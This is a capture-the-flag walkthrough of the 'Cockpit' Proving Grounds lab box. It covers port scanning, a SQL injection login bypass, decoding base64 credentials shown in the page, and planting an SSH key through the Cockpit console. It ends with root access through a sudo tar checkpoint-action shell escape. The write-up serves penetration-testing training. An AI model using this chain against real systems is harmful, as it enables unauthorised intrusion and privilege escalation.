# Cockpit - Walkthrough

Cockpit is an intermediate box on OFFSEC’s Proving Grounds and the community agrees that it is intermediate difficulty.

## Recon
Start scanning all ports:
```
sudo nmap -p- 192.168.134.10 -T5 -v    
```
![Scan de todas as portas](/assets/images/Cockpit/1.png)

Port 9090 scan:

```
nmap -sC -sV -Pn -p9090 192.168.134.10 -v
```

There is an service called Cockpit in this door.

## Enumeration

I listed the directories for port 80 and found a login.php page:

```
sudo dirsearch -u http://192.168.146.10 -r -o /usr/share/seclists/Discovery/Web-Content/dirsearch.txt   
```

![login](/assets/images/Cockpit/3.png)

Login page:
![login](/assets/images/Cockpit/4.png)

I put a quotation mark in the username field to try an Injection and got an error message:
![sql](/assets/images/Cockpit/5.png)

While researching how to log in with sql injection, I came across the following [SecLists page](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt)

I used the payload < username >‘-- as admin’-- - and was able to access the target. It would also work with ‘OR ’' = '

![sql](/assets/images/Cockpit/6.png)

I gained access to a page listing 2 users and hashes

![sql](/assets/images/Cockpit/7.png)

*james:Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=*<br>
*cameron:dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy*

The equal sign at the end of one of the passwords shows that it is base64 encoded, so I tried to crack the passwords:

```
┌──(kali㉿kali)-[~/Desktop/pen200/labs/Cockpit]
└─$ echo -n 'Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=' | base64 -d 
canttouchhhthiss@455152 
```

```
┌──(kali㉿kali)-[~/Desktop/pen200/labs/Cockpit]
└─$ echo -n 'dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy' | base64 -d
thisscanttbetouchedd@455152    
```
I accessed port 9090 and used james' credentials to log in

## Exploitation

Inside the application I accessed the accounts menu, which had the james and root accounts:

![accs](/assets/images/Cockpit/11.png)

I clicked on james and there was a field to add a Public SSH Key:
![ssh](/assets/images/Cockpit/12.png)

I used ssh-keygen to create a public key and a private SSH key:

```
┌──(kali㉿kali)-[~/Desktop/pen200/labs/Cockpit]
└─$ ssh-keygen                   
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): jamescockpit
Enter passphrase for "jamescockpit" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in jamescockpit
Your public key has been saved in jamescockpit.pub
The key fingerprint is:
SHA256:wHF3akjLU+4GQiq4bKk1njQ4zwfo/p7kyOHBpG+YrRQ kali@kali
```

![keygen](/assets/images/Cockpit/13.png)

The Public Key was saved as jamescockpit.pub

![key](/assets/images/Cockpit/14.png)

I copied the contents of the public key into the application

![ssh](/assets/images/Cockpit/15.png)

Then I used the private key to authenticate myself on the host:

```
┌──(kali㉿kali)-[~/Desktop/pen200/labs/Cockpit]
└─$ ssh -i jamescockpit james@192.168.102.10
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)
james@blaze:~$ 
```

![ssh](/assets/images/Cockpit/16.png)

I explored the directory and got the local.txt flag

![flag](/assets/images/Cockpit/17.png)

## Privilege Escalation

I used the sudo -l command to list the user's privileges. The answer shows that the user james can run the tar binary as root

```
james@blaze:~$ sudo -l
```
![sudo](/assets/images/Cockpit/18.png)

I searched GTFOBINS for ways to exploit the tar binary sudo:

![gtfo](/assets/images/Cockpit/19.png)

Then I executed the command *--checkpoint=1 --checkpoint-action=exec=/bin/sh* along with the binary indicated in sudo -l to elevate my privilege to root

```
james@blaze:~$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
![sudo](/assets/images/Cockpit/20.png)

I explored the host and got the proof.txt flag

![sudo](/assets/images/Cockpit/21.png)
